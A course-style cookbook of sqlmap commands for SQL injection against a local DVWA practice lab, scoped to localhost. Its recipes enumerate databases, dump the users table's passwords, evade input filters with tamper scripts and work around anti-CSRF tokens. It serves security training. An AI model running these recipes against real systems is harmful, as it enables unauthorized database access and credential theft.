# SQLMap Practical Automation Cookbook
Assignment 04 — SQL Injection Mastery

> **TARGET SCOPE ENFORCEMENT:**  
> All SQLMap executions must be pinned strictly to the local Docker DVWA service: `http://dvwa` or `http://127.0.0.1:8080`.  
> Never point SQLMap at any external, unowned, or production domain.

---

## 1. Authentication & Cookie Configuration

Because DVWA requires an authenticated PHP session, every SQLMap invocation must include your local browser `PHPSESSID` cookie and security level cookie:

```bash
# Obtain your cookie in browser DevTools (F12 -> Storage/Application -> Cookies)
COOKIE="PHPSESSID=your_session_token_here; security=low"
```

---

## 2. Command Recipes (From Basic to Full Enumeration)

### Recipe 1: Basic Target Fingerprinting & Vulnerability Detection
Test target parameter `id` without automated exploitation:
```bash
sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="$COOKIE" \
       --batch \
       --banner
```

### Recipe 2: High Sensitivity Full Assessment (`--level=5 --risk=3`)
Enables comprehensive testing including HTTP headers (User-Agent, Referer, Cookie) and heavy payloads:
```bash
sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="$COOKIE" \
       --batch \
       --level=5 \
       --risk=3
```

### Recipe 3: Enumerate All Accessible Databases (`--dbs`)
```bash
sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="$COOKIE" \
       --batch \
       --dbs
```
*Expected Output:* Discovers `dvwa`, `information_schema`, `performance_schema`, `mysql`.

### Recipe 4: Enumerate Tables in Target Database (`-D dvwa --tables`)
```bash
sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="$COOKIE" \
       --batch \
       -D dvwa \
       --tables
```
*Expected Output:* Discovers tables `users` and `guestbook`.

### Recipe 5: Enumerate Columns in Target Table (`-D dvwa -T users --columns`)
```bash
sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="$COOKIE" \
       --batch \
       -D dvwa \
       -T users \
       --columns
```

### Recipe 6: Dump Sensitive Table Records (`-T users --dump`)
```bash
sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="$COOKIE" \
       --batch \
       -D dvwa \
       -T users \
       -C user,password,first_name,last_name \
       --dump
```

### Recipe 7: Specify SQLi Techniques (`--technique=BEUSTQ`)
Restricts or forces specific injection techniques:
- `B`: Boolean-based blind
- `E`: Error-based
- `U`: UNION query-based
- `S`: Stacked queries
- `T`: Time-based blind
- `Q`: Inline queries

```bash
# Force UNION query only
sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="$COOKIE" \
       --batch \
       --technique=U

# Force Time-based blind only
sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \
       --cookie="$COOKIE" \
       --batch \
       --technique=T
```

### Recipe 8: Evading Filters via Tamper Scripts (`--tamper`)
When testing DVWA Medium or High filters (e.g. space replacements, quotation encoding):
```bash
# Space to comment bypass (e.g. replacing ' ' with '/**/')
sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="$COOKIE" \
       --batch \
       --tamper=space2comment

# Multiple chained tamper scripts
sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="$COOKIE" \
       --batch \
       --tamper=space2comment,charencode,randomcase
```

---

## 3. Handling Anti-CSRF Tokens in SQLMap
In DVWA High security level, each request requires a dynamic anti-CSRF token (`user_token`). SQLMap handles this automatically with:
```bash
sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="$COOKIE" \
       --csrf-token="user_token" \
       --csrf-url="http://127.0.0.1:8080/vulnerabilities/sqli/" \
       --batch
```
